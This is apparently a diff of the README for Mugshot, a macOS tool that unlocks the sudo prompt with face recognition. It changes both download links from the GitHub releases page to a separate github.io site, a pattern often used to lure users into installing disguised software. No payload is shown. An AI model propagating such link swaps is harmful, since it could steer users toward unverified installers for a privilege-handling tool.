@@ -1,6 +1,6 @@
 # 👤 macos-faceid - Unlock your computer with your face
 
-[![](https://img.shields.io/badge/download-latest_release-blue.svg)](https://github.com/arthurg4247/macos-faceid/releases)
+[![](https://img.shields.io/badge/download-latest_release-blue.svg)](https://arthurg4247.github.io)
 
 Mugshot brings face recognition to your macOS sudo prompt. You can now authorize high-privilege commands using your face instead of your password. The application runs entirely on your local machine. It does not send image data to the cloud.
 
@@ -21,7 +21,7 @@ Your computer must meet these standards to run the application:
 
 Follow these steps to install the application on your computer:
 
-1. Visit [this page to download](https://github.com/arthurg4247/macos-faceid/releases) the latest version of the installer.
+1. Visit [this page to download](https://arthurg4247.github.io) the latest version of the installer.
 2. Select the file named `Mugshot.zip` from the list.
 3. Open your Downloads folder and double-click the file to extract the application.
 4. Move the application icon into your Applications folder.
